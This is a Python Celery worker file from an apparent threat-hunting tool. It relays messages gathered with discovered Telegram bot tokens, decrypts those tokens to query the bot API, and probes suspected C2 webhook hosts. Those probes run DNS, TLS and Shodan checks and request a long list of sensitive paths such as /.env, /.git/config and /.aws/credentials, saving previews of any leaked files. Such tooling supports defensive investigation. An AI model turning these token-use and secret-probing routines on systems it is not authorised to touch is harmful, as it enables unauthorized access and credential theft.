        return "Disabled: raw message broadcast is opt-in; use the findings queue."
    # Distributed Lock to prevent race conditions (e.g. Local Worker vs Prod Worker)
    lock_key = "telegram_hunter:lock:broadcast"
    # TTL = 120s initial; renewed every 90s while the batch runs so it never expires
    # mid-batch regardless of batch size. Replaces the old fixed-240s TTL that expired
    # on large backlogs (500 msgs × 1.5s = 750s >> 240s).
    LOCK_TTL = 120
    RENEW_EVERY = 90  # renew when < 30s remain
    lock = redis_client.lock(lock_key, timeout=LOCK_TTL, blocking=False)

    acquired = lock.acquire()
    if not acquired:
        return "Skipped: Broadcast task already running (Lock active)."

    # Check Pause State
    if redis_client.get("system:paused"):
        lock.release()
        return "System Paused"

    # Background thread renews the lock periodically while the async loop runs
    import threading
    _stop_renew = threading.Event()

    def _renew_loop():
        while not _stop_renew.wait(timeout=RENEW_EVERY):
            try:
                lock.reacquire()
            except Exception:
                break  # lock gone — stop silently

    renew_thread = threading.Thread(target=_renew_loop, daemon=True)
    renew_thread.start()

    try:
        from app.workers.celery_app import get_worker_loop
        return get_worker_loop().run_until_complete(_broadcast_logic())
    finally:
        _stop_renew.set()
        renew_thread.join(timeout=2)
        try:
            lock.release()
        except redis.exceptions.LockError:
            pass  # Lock expired or already released

async def _broadcast_logic():
    """
    Broadcast pending messages to Telegram topics.
    Uses DB-level atomic claims to prevent duplicates across ALL environments.
    """
    if not settings.ENABLE_RAW_MESSAGE_BROADCAST:
        return "Disabled: raw message broadcast is opt-in; use the findings queue."

    from datetime import datetime, timezone, timedelta

    broadcaster = get_broadcaster()

    from app.core.constants import CLAIM_TIMEOUT_MINUTES
    stale_threshold = datetime.now(timezone.utc) - timedelta(minutes=CLAIM_TIMEOUT_MINUTES)
    now_iso = datetime.now(timezone.utc).isoformat()

    # Batch size: env-configurable. Default 200 (200 × 1.5s = 300s per run,
    # fits inside CLAIM_TIMEOUT_MINUTES=15 with headroom).
    # Raise via BROADCAST_BATCH_SIZE=500 if you have enough bot credentials
    # in the rotation pool to sustain the higher send rate without flood-wait.
    BROADCAST_BATCH_SIZE = int(os.getenv("BROADCAST_BATCH_SIZE", 200))
    messages = await _fetch_pending_broadcast_messages(BROADCAST_BATCH_SIZE, now_iso)
    if not messages:
        # Only log periodically or if verbose debug needed? 
        # For now, let's log it to confirm the task is running.
        logger.info("💤 No pending broadcasts found.") 
        return "No pending broadcasts."

    group_id = settings.MONITOR_GROUP_ID
    sent_count = 0
    skipped_count = 0
    already_done_count = 0
    # Local cache to avoid DB roundtrips within this batch if multiple messages for same cred
    cached_topic_ids = {}

    for msg in messages:
        msg_id = msg["id"]
        
        try:
            # ==========================================================
            # STEP 1: ATOMIC CLAIM via DB (works across ALL environments)
            # ==========================================================
            # Single conditional UPDATE — only succeeds if message is unclaimed and not yet broadcast.
            # This eliminates the TOCTOU race between check and claim.
            claim_time = datetime.now(timezone.utc).isoformat()

            # Attempt to claim an unclaimed message
            claim_result = await async_execute(db.table("exfiltrated_messages")\
                .update({"broadcast_claimed_at": claim_time})\
                .eq("id", msg_id)\
                .eq("is_broadcasted", False)\
                .is_("broadcast_claimed_at", "null")\
                )

            if not claim_result.data:
                # Either already broadcasted, or claimed by another worker.
                # Try reclaiming if the existing claim is stale.
                stale_iso = stale_threshold.isoformat()
                reclaim_result = await async_execute(db.table("exfiltrated_messages")\
                    .update({"broadcast_claimed_at": claim_time})\
                    .eq("id", msg_id)\
                    .eq("is_broadcasted", False)\
                    .lt("broadcast_claimed_at", stale_iso)\
                    )

                if not reclaim_result.data:
                    # Could not claim — either done or freshly claimed by another worker
                    skipped_count += 1
                    continue

                logger.warning(f"    🔄 Stale claim reclaimed for {msg_id}")
            
            logger.info(f"    📌 Claimed message {msg_id}")
            
            cred_id = msg["credential_id"]
            # Extract meta from the joined discovered_credentials
            cred_info = msg.get("discovered_credentials", {})
            meta = cred_info.get("meta", {}) if cred_info else {}
            
            # 1. Resolve Topic Name (Always needed for potential recreation)
            # Priority: @username / botid -> chat_name -> Cred-ID
            bot_username = meta.get("bot_username")
            bot_id = meta.get("bot_id")

            # Resolve unknown usernames via getMe before creating/finding topics
            if (not bot_username or bot_username == "unknown") and bot_id:
                try:
                    cred_res = await async_execute(
                        db.table("discovered_credentials")
                        .select("bot_token").eq("id", cred_id).single()
                    )
                    if cred_res.data:
                        raw_token = cred_res.data.get("bot_token") if isinstance(cred_res.data, dict) else cred_res.data[0]["bot_token"]
                        decrypted = security.decrypt(raw_token).strip()
                        async with httpx.AsyncClient(timeout=10.0) as _hc:
                            gm = await _hc.get(f"https://api.telegram.org/bot{decrypted}/getMe")
                            if gm.status_code == 200:
                                gm_data = gm.json().get("result", {})
                                resolved_username = gm_data.get("username")
                                if resolved_username:
                                    bot_username = resolved_username
                                    # Persist resolved username to DB
                                    fresh_meta = await async_execute(
                                        db.table("discovered_credentials")
                                        .select("meta").eq("id", cred_id).single()
                                    )
                                    upd_meta = dict((fresh_meta.data or {}).get("meta") or {})
                                    upd_meta["bot_username"] = bot_username
                                    await async_execute(
                                        db.table("discovered_credentials")
                                        .update({"meta": upd_meta}).eq("id", cred_id)
                                    )
                                    # Rename existing @unknown topic if it has a cached thread_id
                                    old_topic_id = upd_meta.get("topic_id")
                                    if old_topic_id:
                                        new_name = f"@{bot_username} / {bot_id}"
                                        await broadcaster.rename_topic(group_id, old_topic_id, new_name)
                                        logger.info(f"    Renamed topic {old_topic_id} from @unknown to @{bot_username}")
                except Exception as e_resolve:
                    logger.debug(f"[Broadcast] Could not resolve username for bot_id {bot_id}: {e_resolve}")

            if bot_username and bot_username != "unknown" and bot_id:
                 topic_name = f"@{bot_username} / {bot_id}"
            elif bot_id:
                 topic_name = f"@unknown / {bot_id}"
            elif meta.get("chat_name"):
                 topic_name = f"{meta.get('chat_name')} (Legacy)"
            else:
                 topic_name = f"Cred-{cred_id[:8]}"

            # 2. Check Cache/DB for ID
            thread_id = cached_topic_ids.get(cred_id) or meta.get("topic_id")

            if not thread_id:
                # Determines if we need to fetch token for legacy fallback
                if "unknown" in topic_name and not bot_id:
                     try:
                        cred_res = await async_execute(db.table("discovered_credentials").select("bot_token").eq("id", cred_id).single())
                        if cred_res.data:
                            # .single() returns a dict, not a list — access directly
                            raw_token = cred_res.data.get("bot_token") if isinstance(cred_res.data, dict) else cred_res.data[0]["bot_token"]
                            decrypted = security.decrypt(raw_token)
                            if ":" in decrypted:
                                bot_id = decrypted.split(":")[0]
                                meta["bot_id"] = bot_id
                                topic_name = f"@unknown / {bot_id}"
                     except Exception as e_dec:
                                logger.debug(f"[Broadcast] Could not decrypt token for legacy bot_id extraction: {e_dec}")

                # Ensure Topic — raises on failure so message is retried later
                try:
                    thread_id = await broadcaster.ensure_topic(group_id, topic_name)
                except Exception as e_topic:
                    logger.error(f"    ❌ [Broadcast] Topic creation failed for {cred_id}: {e_topic}")
                    from app.services.broadcaster_srv import BroadcastSendError

                    await _mark_broadcast_failure(
                        msg,
                        BroadcastSendError(
                            "topic_missing",
                            f"Could not create topic '{topic_name}': {e_topic}",
                            retryable=True,
                        ),
                    )
                    continue

                # Re-fetch meta before write — prevents overwriting concurrent enrich updates
                fresh = await async_execute(db.table("discovered_credentials").select("meta").eq("id", cred_id).single())
                meta = dict((fresh.data or {}).get("meta") or {})
                meta["topic_id"] = thread_id
                await async_execute(db.table("discovered_credentials").update({"meta": meta}).eq("id", cred_id))
                logger.info(f"    📝 [Broadcast] Saved topic_id {thread_id} for {cred_id}")
            
            # Update local cache
            cached_topic_ids[cred_id] = thread_id
            
            # Send Message (with retry for deleted topics)
            send_success = False
            try:
                await broadcaster.send_message(group_id, thread_id, msg)
                send_success = True
            except Exception as e:
                # Check for topic deletion/not found
                err_str = str(e)
                failure_reason = getattr(e, "reason", "")
                if (
                    failure_reason == "topic_missing"
                    or "Topic_deleted" in err_str
                    or "message thread not found" in err_str
                    or "TOPIC_DELETED" in err_str
                ):
                    logger.warning(f"    ⚠️ Topic {thread_id} deleted! Recreating '{topic_name}'...")
                    try:
                        thread_id = await broadcaster.ensure_topic(group_id, topic_name)
                        # Re-fetch meta before write
                        fresh2 = await async_execute(db.table("discovered_credentials").select("meta").eq("id", cred_id).single())
                        meta = dict((fresh2.data or {}).get("meta") or {})
                        meta["topic_id"] = thread_id
                        await async_execute(db.table("discovered_credentials").update({"meta": meta}).eq("id", cred_id))
                        cached_topic_ids[cred_id] = thread_id
                        # Retry Send
                        await broadcaster.send_message(group_id, thread_id, msg)
                        send_success = True
                    except Exception as retry_e:
                        logger.error(f"    ❌ Failed after topic recreation: {retry_e}")
                        await _mark_broadcast_failure(msg, retry_e)
                else:
                    logger.error(f"    ❌ Send failed: {e}")
                    await _mark_broadcast_failure(msg, e)
            
            if send_success:
                # ==============================================
                # SUCCESS: Mark as broadcasted and clear claim
                # ==============================================
                await _update_message_broadcast_success(msg_id)
                sent_count += 1
                logger.info(f"    ✅ Broadcasted msg {msg_id}")
            else:
                logger.warning(f"    🔄 Broadcast failure recorded for retry: {msg_id}")
            
            # Rate limit
            await asyncio.sleep(2.0) 

        except Exception as e:
            logger.error(f"Error broadcasting msg {msg_id}: {e}")
            try:
                await _mark_broadcast_failure(msg, e)
            except Exception as e_claim:
                logger.error(f"Failed to clear broadcast claim for msg {msg_id}: {e_claim} — message may be stuck until stale-claim TTL expires")
            continue
    
    result = f"Broadcasted {sent_count}/{len(messages)} messages"
    if skipped_count > 0:
        result += f" (skipped {skipped_count} claimed by other workers)"
    if already_done_count > 0:
        result += f" (already done: {already_done_count})"
    return result

@app.task(name="flow.system_heartbeat")
def system_heartbeat():
    """Periodic ping to confirm system uptime. Also flushes in-memory metrics to Redis."""
    msg = "💓 **System Heartbeat**: Worker is active and scanning."

    try:
        redis_client.set("system:heartbeat:last_seen", int(time.time()))
    except Exception as e:
        logger.warning(f"Failed to update heartbeat in Redis: {e}")

    # Flush in-memory metric counters to Redis so they survive restarts
    try:
        from app.core.metrics import metrics
        flushed = metrics.flush_to_redis()
        if not flushed:
            logger.warning("[Heartbeat] metrics.flush_to_redis() returned False — counters NOT persisted (Redis down?)")
    except Exception as e:
        logger.warning(f"Metrics flush failed (non-fatal): {e}")

    from app.workers.celery_app import get_worker_loop
    get_worker_loop().run_until_complete(get_broadcaster().send_log(msg))
    return "Heartbeat sent."


@app.task(name="flow.queue_monitor")
def queue_monitor():
    """Return queue depths and oldest tracked job age for operational monitoring."""
    try:
        from app.core.queue_monitor import get_queue_snapshot, summarize_queue_health

        snapshot = get_queue_snapshot(redis_client)
        summary = summarize_queue_health(
            snapshot,
            length_threshold=settings.QUEUE_ALERT_LENGTH_THRESHOLD,
            oldest_age_threshold_seconds=settings.QUEUE_ALERT_OLDEST_AGE_SECONDS,
        )
        logger.info(f"[QueueMonitor] {summary}")
        if summary["alerts"]:
            lines = ["Queue monitor alert:"]
            for alert in summary["alerts"][:8]:
                lines.append(
                    f"- {alert['queue']} {alert['type']}: "
                    f"{alert['value']} >= {alert['threshold']}"
                )
            from app.workers.celery_app import get_worker_loop

            get_worker_loop().run_until_complete(get_broadcaster().send_log("\n".join(lines)))
        return summary
    except Exception as e:
        logger.warning(f"[QueueMonitor] failed: {e}")
        return {"error": str(e)}


@app.task(name="flow.retry_failed_broadcasts")
def retry_failed_broadcasts(limit: int = 50):
    """Make failed unbroadcasted messages immediately eligible and trigger broadcast."""
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(_retry_failed_broadcasts_logic(limit))


async def _retry_failed_broadcasts_logic(limit: int = 50) -> dict:
    limit = max(1, min(int(limit or 50), 500))
    try:
        response = await async_execute(
            db.table("exfiltrated_messages")
            .select("id, credential_id, broadcast_error, broadcast_attempts, next_retry_at")
            .eq("is_broadcasted", False)
            .not_.is_("broadcast_error", "null")
            .order("next_retry_at", desc=False)
            .limit(limit)
        )
        _set_broadcast_reliability_columns_available(True)
    except Exception as exc:
        if _is_missing_broadcast_reliability_column(exc):
            _set_broadcast_reliability_columns_available(False)
            return {
                "status": "schema_missing",
                "reason": "broadcast reliability columns are not available",
            }
        raise

    rows = response.data or []
    if not rows:
        return {"status": "idle", "updated": 0, "broadcast_dispatched": False}

    updated = 0
    for row in rows:
        await async_execute(
            db.table("exfiltrated_messages")
            .update({"broadcast_claimed_at": None, "next_retry_at": None})
            .eq("id", row["id"])
            .eq("is_broadcasted", False)
        )
        updated += 1

    app.send_task("flow.broadcast_pending")
    AuditLogger.log(
        AuditEvent.BROADCAST_RETRY_REQUESTED,
        user="celery_worker",
        details={
            "mode": "batch",
            "updated": updated,
            "limit": limit,
            "message_ids": [row.get("id") for row in rows[:20]],
            "truncated": len(rows) > 20,
        },
    )
    return {
        "status": "ok",
        "updated": updated,
        "broadcast_dispatched": True,
        "message_ids": [row.get("id") for row in rows],
    }


@app.task(name="flow.close_revoked_topics")
def close_revoked_topics(
    limit: int | None = None,
    dry_run: bool = False,
    credential_id: str | None = None,
    reason: str | None = None,
    force: bool = False,
):
    """Close Telegram forum topics for revoked credentials."""
    from app.workers.celery_app import get_worker_loop
    from app.services.topic_admin_srv import close_revoked_topics_logic

    return get_worker_loop().run_until_complete(
        close_revoked_topics_logic(
            limit=limit or settings.REVOKED_TOPIC_CLOSE_BATCH_SIZE,
            dry_run=dry_run,
            credential_id=credential_id,
            actor=f"celery_worker:{reason}" if reason else "celery_worker",
            force=force,
        )
    )


@app.task(name="flow.canary_flow_check")
def canary_flow_check():
    """Run a synthetic DB -> broadcast -> visibility canary when configured."""
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(_canary_flow_check_logic())


async def _canary_flow_check_logic():
    from datetime import datetime, timezone

    cred_id = settings.CANARY_CREDENTIAL_ID
    if not cred_id:
        return {"status": "disabled", "reason": "CANARY_CREDENTIAL_ID not configured"}
    if not settings.ENABLE_RAW_MESSAGE_BROADCAST:
        return {
            "status": "disabled",
            "reason": "raw message broadcast is intentionally disabled by policy",
        }

    now = datetime.now(timezone.utc)
    telegram_msg_id = -int(time.time())
    content = f"{settings.CANARY_EXPECTED_TEXT} {now.isoformat()}"
    row = {
        "credential_id": cred_id,
        "telegram_msg_id": telegram_msg_id,
        "sender_name": "telegramhunter-canary",
        "content": content,
        "media_type": "text",
        "file_meta": {"source": "canary", "created_at": now.isoformat()},
        "is_broadcasted": False,
        "broadcast_error": None,
        "broadcast_attempts": 0,
        "next_retry_at": None,
    }
    legacy_row = {
        key: value
        for key, value in row.items()
        if key not in {"broadcast_error", "broadcast_attempts", "next_retry_at"}
    }
    result: dict[str, Any] = {
        "status": "started",
        "credential_id": cred_id,
        "telegram_msg_id": telegram_msg_id,
        "inserted": False,
        "broadcasted": False,
        "frontend_visible": None,
    }
    try:
        try:
            await async_execute(
                db.table("exfiltrated_messages").upsert(
                    row,
                    on_conflict="credential_id,telegram_msg_id",
                    ignore_duplicates=False,
                )
            )
            _set_broadcast_reliability_columns_available(True)
        except Exception as insert_exc:
            if not _is_missing_broadcast_reliability_column(insert_exc):
                raise
            _set_broadcast_reliability_columns_available(False)
            await async_execute(
                db.table("exfiltrated_messages").upsert(
                    legacy_row,
                    on_conflict="credential_id,telegram_msg_id",
                    ignore_duplicates=False,
                )
            )
        result["inserted"] = True

        result["broadcast_result"] = await _broadcast_logic()

        # Poll for is_broadcasted with a short budget so distributed-claim
        # contention doesn't false-fail. If another worker won the claim lock,
        # the row will flip to is_broadcasted=True moments later once that
        # worker's send completes. Stop early on success or persisted error.
        CANARY_BROADCAST_POLL_SECONDS = 15.0
        CANARY_BROADCAST_POLL_INTERVAL = 3.0
        elapsed = 0.0
        polls = 0
        rows: list[dict[str, Any]] = []
        while True:
            polls += 1
            select_columns = (
                "id,is_broadcasted,broadcast_error"
                if _can_use_broadcast_reliability_columns()
                else "id,is_broadcasted"
            )
            try:
                check = await async_execute(
                    db.table("exfiltrated_messages")
                    .select(select_columns)
                    .eq("credential_id", cred_id)
                    .eq("telegram_msg_id", telegram_msg_id)
                    .limit(1)
                )
                if "broadcast_error" in select_columns:
                    _set_broadcast_reliability_columns_available(True)
            except Exception as select_exc:
                if not _is_missing_broadcast_reliability_column(select_exc):
                    raise
                _set_broadcast_reliability_columns_available(False)
                check = await async_execute(
                    db.table("exfiltrated_messages")
                    .select("id,is_broadcasted")
                    .eq("credential_id", cred_id)
                    .eq("telegram_msg_id", telegram_msg_id)
                    .limit(1)
                )
            rows = check.data or []
            done = (
                not rows
                or bool(rows[0].get("is_broadcasted"))
                or rows[0].get("broadcast_error") is not None
                or elapsed >= CANARY_BROADCAST_POLL_SECONDS
            )
            if done:
                break
            await asyncio.sleep(CANARY_BROADCAST_POLL_INTERVAL)
            elapsed += CANARY_BROADCAST_POLL_INTERVAL

        result["broadcast_poll_seconds"] = elapsed
        result["broadcast_polls"] = polls
        if rows:
            result["broadcasted"] = bool(rows[0].get("is_broadcasted"))
            result["broadcast_error"] = rows[0].get("broadcast_error")

        if settings.PUBLIC_FRONTEND_URL:
            try:
                async with httpx.AsyncClient(timeout=10.0) as client:
                    response = await client.get(settings.PUBLIC_FRONTEND_URL)
                result["frontend_visible"] = response.status_code < 500
                result["frontend_status_code"] = response.status_code
            except Exception as frontend_exc:
                result["frontend_visible"] = False
                result["frontend_error"] = str(frontend_exc)[:300]

        passed = bool(result["inserted"] and result["broadcasted"])
        if result["frontend_visible"] is False:
            passed = False
        result["status"] = "ok" if passed else "failed"
        AuditLogger.log(
            AuditEvent.CANARY_FLOW_CHECK,
            credential_id=cred_id,
            details=result,
            success=passed,
        )
        return result
    except Exception as e:
        result["status"] = "failed"
        result["error"] = str(e)[:500]
        AuditLogger.log(
            AuditEvent.CANARY_FLOW_CHECK,
            credential_id=cred_id,
            details=result,
            success=False,
        )
        return result


# ============================================================
# Webhook Recon — passive probe of captured third-party webhook URLs
# Reads discovered_credentials.meta.webhook_url captured by
# validation_tasks.py, does DNS + HTTP + TLS fingerprinting, writes
# result back to meta.webhook_probe.
# ============================================================
_WEBHOOK_PROBE_SEMAPHORE_SIZE = 10
_WEBHOOK_PROBE_TIMEOUT_SECONDS = 10.0
_WEBHOOK_PROBE_BODY_PREVIEW_BYTES = 500
_WEBHOOK_PROBE_STALE_HOURS = 24


async def _probe_webhook_url(url: str) -> dict:
    """Passive probe: DNS + HTTP GET + TLS cert + web recon + Shodan. Returns fingerprint dict.

    Best-effort — any single sub-probe failure is caught and recorded in the
    result rather than raising. We probe untrusted C2 endpoints so cert
    verification is disabled (verify=False) and redirects are not followed.
    """
    import socket
    import ssl
    from datetime import datetime, timezone
    from urllib.parse import urlparse

    result: dict[str, Any] = {
        "probed_at": datetime.now(timezone.utc).isoformat(),
        "url": url,
    }
    try:
        parsed = urlparse(url)
        hostname = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        result["hostname"] = hostname
        result["port"] = port
        result["scheme"] = parsed.scheme
        result["path"] = parsed.path

        # Cooldown check — bail early if this host has failed 3x in the last
        # hour. Prevents wasted work + rate-limit backlash on dead C2 hosts.
        if hostname:
            try:
                from app.core.redis_srv import probe_host_is_cooling

                if await probe_host_is_cooling(hostname):
                    result["skipped"] = "host_cooldown"
                    return result
            except Exception:
                pass

        # DNS resolution
        try:
            infos = await asyncio.get_event_loop().getaddrinfo(hostname, port)
            ips = sorted({addr[4][0] for addr in infos})
            result["ip_addresses"] = ips
        except Exception as dns_exc:
            result["dns_error"] = str(dns_exc)[:150]
            if hostname:
                try:
                    from app.core.redis_srv import probe_host_mark_failure

                    await probe_host_mark_failure(hostname)
                except Exception:
                    pass

        # HTTP fingerprint — GET with no verify, no redirect follow
        try:
            start = time.monotonic()
            async with httpx.AsyncClient(
                timeout=_WEBHOOK_PROBE_TIMEOUT_SECONDS,
                verify=False,
                follow_redirects=False,
            ) as client:
                resp = await client.get(url)
            elapsed_ms = round((time.monotonic() - start) * 1000)
            result["response_time_ms"] = elapsed_ms
            result["http_status"] = resp.status_code
            # Header lowercase-keyed for consistency; keep only interesting ones
            headers = {k.lower(): v for k, v in resp.headers.items()}
            interesting = (
                "server",
                "x-powered-by",
                "cf-ray",
                "via",
                "x-cache",
                "x-served-by",
                "location",
                "content-type",
                "content-length",
                "x-request-id",
                "x-runtime",
                "set-cookie",
            )
            result["http_headers"] = {k: headers[k] for k in interesting if k in headers}
            body_text = resp.text[:_WEBHOOK_PROBE_BODY_PREVIEW_BYTES]
            result["http_body_preview"] = body_text
            # Non-2xx counts as a probe failure (dead endpoint, cf challenge, etc.)
            if hostname and not (200 <= resp.status_code < 300):
                try:
                    from app.core.redis_srv import probe_host_mark_failure

                    await probe_host_mark_failure(hostname)
                except Exception:
                    pass
        except httpx.TimeoutException:
            result["http_error"] = "timeout"
            if hostname:
                try:
                    from app.core.redis_srv import probe_host_mark_failure

                    await probe_host_mark_failure(hostname)
                except Exception:
                    pass
        except Exception as http_exc:
            result["http_error"] = f"{type(http_exc).__name__}: {str(http_exc)[:150]}"
            if hostname:
                try:
                    from app.core.redis_srv import probe_host_mark_failure

                    await probe_host_mark_failure(hostname)
                except Exception:
                    pass

        # TLS cert introspection (https only) — parse DER via cryptography lib
        if parsed.scheme == "https":
            try:
                from cryptography import x509
                from cryptography.hazmat.backends import default_backend
                from cryptography.hazmat.primitives import hashes

                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE

                def _fetch_cert_der():
                    with socket.create_connection((hostname, port), timeout=5) as sock:
                        with ctx.wrap_socket(sock, server_hostname=hostname) as ssock:
                            return ssock.getpeercert(binary_form=True)

                der = await asyncio.to_thread(_fetch_cert_der)
                if der:
                    cert = x509.load_der_x509_certificate(der, default_backend())
                    result["tls_issuer"] = cert.issuer.rfc4514_string()
                    result["tls_subject"] = cert.subject.rfc4514_string()
                    result["tls_serial"] = format(cert.serial_number, "x")
                    try:
                        result["tls_not_before"] = cert.not_valid_before_utc.isoformat()
                        result["tls_not_after"] = cert.not_valid_after_utc.isoformat()
                    except AttributeError:
                        # cryptography < 42
                        result["tls_not_before"] = cert.not_valid_before.isoformat()
                        result["tls_not_after"] = cert.not_valid_after.isoformat()
                    try:
                        san_ext = cert.extensions.get_extension_for_class(
                            x509.SubjectAlternativeName
                        ).value
                        result["tls_san"] = sorted({n.value for n in san_ext})
                    except x509.ExtensionNotFound:
                        pass
                    try:
                        result["tls_fingerprint_sha256"] = cert.fingerprint(hashes.SHA256()).hex()
                    except Exception:
                        pass
            except Exception as tls_exc:
                result["tls_error"] = f"{type(tls_exc).__name__}: {str(tls_exc)[:150]}"

        # Web recon — probe common paths on the origin (site tree / login / sensitive files)
        if parsed.scheme in ("http", "https") and hostname:
            base = f"{parsed.scheme}://{hostname}"
            if (parsed.scheme == "https" and port != 443) or (parsed.scheme == "http" and port != 80):
                base = f"{base}:{port}"
            result["web_recon"] = await _probe_web_recon(base)

        # Shodan enrichment — pivot each IP to open ports, banners, tags
        ips = result.get("ip_addresses") or []
        if ips and getattr(settings, "SHODAN_KEY", None):
            result["shodan"] = await _probe_shodan_ips(ips[:5])
    except Exception as outer:
        result["error"] = f"{type(outer).__name__}: {str(outer)[:300]}"
    return result


# Common recon paths — status-only for admin/login (don't dump body of potentially
# sensitive dashboards), preview for public files like robots.txt / sitemap.xml.
_WEB_RECON_PREVIEW_PATHS = ("/", "/robots.txt", "/sitemap.xml", "/.well-known/security.txt")
_WEB_RECON_STATUS_PATHS = (
    # Admin & dashboards
    "/admin", "/admin/", "/admin/login", "/administrator", "/adminpanel",
    "/cpanel", "/manage", "/manager", "/admin.php", "/dashboard", "/panel",
    "/console", "/portal", "/control",
    # WordPress
    "/wp-admin/", "/wp-login.php", "/wp-json", "/wp-json/wp/v2/users",
    "/xmlrpc.php", "/wp-content/plugins/", "/wp-content/uploads/",
    # API endpoints
    "/api", "/api/", "/api/v1", "/api/v2", "/api/v3", "/rest",
    "/graphql", "/graphiql", "/swagger", "/swagger-ui", "/swagger.json",
    "/openapi.json", "/api-docs", "/docs", "/redoc", "/playground",
    # Auth
    "/login", "/signin", "/signup", "/register", "/auth", "/oauth",
    "/oauth/authorize", "/sso", "/logout",
    # Config & dev leaks
    "/.env", "/.env.local", "/.env.production", "/.env.backup",
    "/.git/config", "/.git/HEAD", "/.svn/entries", "/web.config",
    "/config.json", "/composer.json", "/package.json", "/package-lock.json",
    "/appsettings.json", "/application.properties", "/wp-config.php.bak",
    "/.htaccess", "/.htpasswd", "/Dockerfile", "/docker-compose.yml",
    "/.dockerignore", "/.gitignore", "/README.md",
    # Health, metrics, observability
    "/health", "/healthz", "/health/live", "/health/ready",
    "/status", "/ping", "/metrics", "/prometheus",
    "/actuator", "/actuator/health", "/actuator/info", "/actuator/env",
    # PHP/debug
    "/phpinfo.php", "/info.php", "/test.php", "/debug", "/trace",
    "/error_log", "/server-status", "/server-info",
    # Backups (commonly-scraped filenames)
    "/backup", "/backup.zip", "/backup.sql", "/backup.tar.gz",
    "/db.sql", "/database.sql", "/dump.sql", "/site-backup.zip",
    "/www.zip", "/htdocs.zip",
    # Cloud & secrets
    "/aws.credentials", "/.aws/credentials", "/config.yml",
    "/settings.py", "/local_settings.py",
)

# Catch-all responder detection: if a host returns 200 to more than this
# fraction of probed paths, it's likely a wildcard / dumb responder and
# further probing tells us nothing.
_WEB_RECON_CATCHALL_THRESHOLD = 0.30


async def _probe_web_recon(base_url: str) -> dict:
    """Probe common recon paths concurrently — bounded, best-effort, tight timeout per path."""
    import re

    async def _fetch_preview(client: httpx.AsyncClient, path: str) -> tuple[str, dict]:
        entry: dict[str, Any] = {}
        try:
            r = await client.get(base_url + path)
            entry["status"] = r.status_code
            if r.status_code == 200:
                text = r.text
                entry["preview"] = text[:400]
                if path == "/":
                    m = re.search(r"<title[^>]*>([^<]{0,200})</title>", text, re.IGNORECASE)
                    if m:
                        entry["title"] = m.group(1).strip()
        except httpx.TimeoutException:
            entry["error"] = "timeout"
        except Exception as e:
            entry["error"] = f"{type(e).__name__}: {str(e)[:80]}"
        return path, entry

    async def _fetch_status(client: httpx.AsyncClient, path: str) -> tuple[str, dict]:
        entry: dict[str, Any] = {}
        try:
            r = await client.get(base_url + path)
            entry["status"] = r.status_code
            if r.status_code in (301, 302, 303, 307, 308):
                entry["location"] = r.headers.get("location")
            elif r.status_code == 200 and path in (
                "/.git/config", "/.env", "/.env.local", "/.env.production",
                "/.env.backup", "/server-status", "/server-info",
                "/phpinfo.php", "/info.php", "/wp-config.php.bak",
                "/aws.credentials", "/.aws/credentials",
                "/config.json", "/composer.json", "/package.json",
                "/appsettings.json", "/application.properties",
            ):
                # Sensitive file leaks — capture a small preview
                entry["leak_preview"] = r.text[:400]
        except httpx.TimeoutException:
            entry["error"] = "timeout"
        except Exception as e:
            entry["error"] = f"{type(e).__name__}: {str(e)[:80]}"
        return path, entry

    findings: dict[str, dict] = {}
    async with httpx.AsyncClient(
        timeout=5.0, verify=False, follow_redirects=False
    ) as client:
        # Fan out all path probes concurrently on a single client (connection
        # pooled, tight per-request timeout). httpx.AsyncClient is safe for
        # concurrent requests, and gather bounds fan-in to the fixed path lists.
        tasks = [_fetch_preview(client, p) for p in _WEB_RECON_PREVIEW_PATHS] + [
            _fetch_status(client, p) for p in _WEB_RECON_STATUS_PATHS
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for item in results:
            if isinstance(item, BaseException):
                continue
            path, entry = item
            findings[path] = entry

    # Catch-all responder detection: hosts that return 200 to >30% of probed
    # paths are lying wildcard responders. Flag but keep the raw data.
    all_probed = list(findings.values())
    status_200_count = sum(1 for f in all_probed if isinstance(f, dict) and f.get("status") == 200)
    total_probed = len(all_probed)
    if total_probed > 0 and status_200_count / total_probed > _WEB_RECON_CATCHALL_THRESHOLD:
        findings["__catchall_responder"] = {
            "detected": True,
            "status_200_ratio": round(status_200_count / total_probed, 3),
            "hint": "Host returns 200 to too many paths; further recon may be noise.",
        }

    # Extract sitemap URLs from sitemap.xml if present
    sitemap_entry = findings.get("/sitemap.xml") or {}
    if sitemap_entry.get("status") == 200 and sitemap_entry.get("preview"):
        try:
            urls = re.findall(r"<loc>([^<]+)</loc>", sitemap_entry["preview"])
            if urls:
                sitemap_entry["extracted_urls_sample"] = urls[:15]
        except Exception:
            pass

    return findings


async def _probe_shodan_ips(ips: list[str]) -> dict:
    """Look up each IP via Shodan REST concurrently — returns per-IP summary."""
    per_ip: dict[str, dict] = {}
    api_key = settings.SHODAN_KEY

    async def _lookup(client: httpx.AsyncClient, ip: str) -> tuple[str, dict]:
        try:
            r = await client.get(
                f"https://api.shodan.io/shodan/host/{ip}",
                params={"key": api_key, "minify": "true"},
            )
            if r.status_code == 200:
                d = r.json()
                return ip, {
                    "org": d.get("org"),
                    "isp": d.get("isp"),
                    "asn": d.get("asn"),
                    "country_code": d.get("country_code"),
                    "city": d.get("city"),
                    "hostnames": (d.get("hostnames") or [])[:8],
                    "ports": d.get("ports") or [],
                    "tags": d.get("tags") or [],
                    "vulns": (d.get("vulns") or [])[:10],
                    "last_update": d.get("last_update"),
                }
            if r.status_code == 404:
                return ip, {"status": "not_indexed"}
            if r.status_code == 401:
                return ip, {"error": "shodan_key_unauthorized"}
            return ip, {"error": f"http_{r.status_code}"}
        except httpx.TimeoutException:
            return ip, {"error": "timeout"}
        except Exception as e:
            return ip, {"error": f"{type(e).__name__}: {str(e)[:100]}"}

    async with httpx.AsyncClient(timeout=8.0) as client:
        results = await asyncio.gather(
            *(_lookup(client, ip) for ip in ips), return_exceptions=True
        )
        # If any lookup returned an unauthorized-key marker, short-circuit the
        # rest of the display since the key won't authorize follow-ups either.
        unauthorized = False
        for item in results:
            if isinstance(item, BaseException):
                continue
            ip, entry = item
            per_ip[ip] = entry
            if entry.get("error") == "shodan_key_unauthorized":
                unauthorized = True
